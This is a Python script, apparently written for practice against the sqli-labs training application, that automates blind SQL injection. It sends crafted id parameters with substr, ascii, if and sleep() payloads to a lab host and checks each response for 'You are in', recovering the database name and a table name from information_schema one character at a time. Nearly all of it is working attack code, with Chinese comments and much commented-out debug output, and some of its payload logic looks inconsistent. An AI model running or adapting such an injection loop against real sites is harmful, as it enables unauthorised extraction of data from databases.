#!/usr/bin/python3.6
# -*- coding: utf-8 -*-

import re
import requests
result1 = []
for a in range(1,9):

	for i in range(97,123):


		#库名url
		#http://172.28.0.21/pentest/sqli-labs/Less-5/?id=1' and substr(database(),2,1)='e'%23
		# url5 = "http://172.28.0.21/pentest/sqli-labs/Less-5/?id=1' and substr(database()," + str(a) + ",1)='"+ chr(i) +"'%23"

		#http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1%22%20and%20if(ascii(substr(database(),1,1))%3E109,sleep(5),1)%23
		
		url6 = "http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1\" and if(ascii(substr(database()," + str(a) + ",4))=" + str(i) + ",sleep(3),1)%23"

		#表名url
		#http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema= "security" limit 0,1),1,1))>100,sleep(3),1)#

		url61 = 'http://172.28.0.21/pentest/sqli-labs/Less-6/?id=1"' + ' and if(ascii(substr((select table_name from information_schema.tables where table_schema='+'"security" limit 0,1),' + str(a) + ',1))=' + str(i) + ',sleep(3),1)%23'
		reg = r'.*(You are in).*'

		# print (url16)
		# print (url61)
		# response = requests.get(url1)
		# time = response.elapsed.microseconds   #打印网页响应时间
		# print (time)
		
		# if time > 6700:
		# 	result1.append(chr(i))
		# 	print (time)
		# 	print (chr(i))
		reg = r'.*(You are in).*'
		response = requests.get(url61)

		# print (response.status_code)
		# print (len(response.text))
		# print (response.content)
		# print (response.encoding)
		# print (response.headers)
		# print (response.json)
		# print (response.text)
		result = re.findall(reg,response.text)
		if result:
			# print ('Query Failed')
			# print (ur61)
			# print ('状态码：'+str(response.status_code))
			# print (response.content)
			# print (response.encoding)
			# print (response.headers)
			# print (response.json)
			# print ('数据包长度：'+str(len(response.text)))
			pass
			# with open ('sql11','a+') as f:
			# 	f.write(response.text)
		else:
			print ('Query Successful')
			# print (url61)
			print ('状态码：'+str(response.status_code))
			# print (response.content)
			# print (response.encoding)
			# print (response.headers)
			# print (response.json)
			print ('数据包长度：'+str(len(response.text)))
			print ("尝试字符:'{0}'".format(chr(i)))
			result1.append(chr(i))
		# reg = r'.*(You are in).*'
# 		response = requests.get(url)
# 		result = re.findall(reg,response.text)
# 		if result:
# 			result1.append(chr(i))	
# 			with open ('sql11','a+') as f:
# 				f.write(response.text)

print ('数据库名是：'+''.join(result1))